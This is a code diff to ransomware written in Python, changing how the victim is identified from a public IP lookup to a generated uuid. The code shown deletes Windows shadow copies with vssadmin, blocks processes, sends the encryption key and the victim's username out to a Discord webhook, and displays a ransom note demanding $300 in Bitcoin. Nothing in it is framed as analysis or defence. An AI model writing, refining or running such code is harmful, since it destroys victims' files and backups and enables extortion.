@@ -1,6 +1,7 @@
 import base64
 import ctypes
 import hashlib
+import uuid
 import os
 import string
 import subprocess
@@ -18,6 +19,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 from win32com.client import Dispatch
 
 YOUR_WEBHOOK_URL = ""
+id = ""
 
 
 def is_admin():
@@ -256,17 +258,6 @@ def delete_shadow_copy():
     execute_command("vssadmin delete shadows /all /quiet")
 
 
-def get_public_ip():
-    try:
-        response = requests.get("https://api.ipify.org")
-        if response.status_code == 200:
-            return response.text
-        else:
-            return "?"
-    except requests.exceptions.RequestException as e:
-        return f"{e}"
-
-
 def check_connection(url="http://www.google.com/", timeout=5):
     try:
         response = requests.get(url, timeout=timeout)
@@ -304,10 +295,12 @@ def block_processes():
 
 
 def start_encryption():
+    global id
     webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
+    id = uuid.uuid1()
     key = os.urandom(16)
     embed = DiscordEmbed(
-        title=f"Username: {os.getlogin()} | Ip: {get_public_ip()} | Date: {datetime.now().strftime("%d-%m-%Y")}",
+        title=f"Username: {os.getlogin()} | ID: {id} | Date: {datetime.now().strftime("%d-%m-%Y")}",
         description=f"Key: {base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()}",
     )
     webhook.add_embed(embed)
@@ -357,7 +350,7 @@ def encrypt_directory(directory_path, key):
 
 
 def shutdown():
-    msg = """==================================================
+    msg = f"""==================================================
             Your files are encrypted!             
 ==================================================
 
@@ -374,7 +367,7 @@ To get them back, you need to follow the instructions below.
 
 3. Instructions for payment:
 - Buy Bitcoin (BTC) and send $300 to the address: [Bitcoin Address Here]
-- After the transaction is confirmed, send an email to [Email Address Here] with your public IP (https://api.ipify.org) and username.
+- After the transaction is confirmed, send an email to [Email Address Here] with your id ({id}) and username.
 - Then, you will then receive a decryption key to unlock your files.
 
 4. Warning!
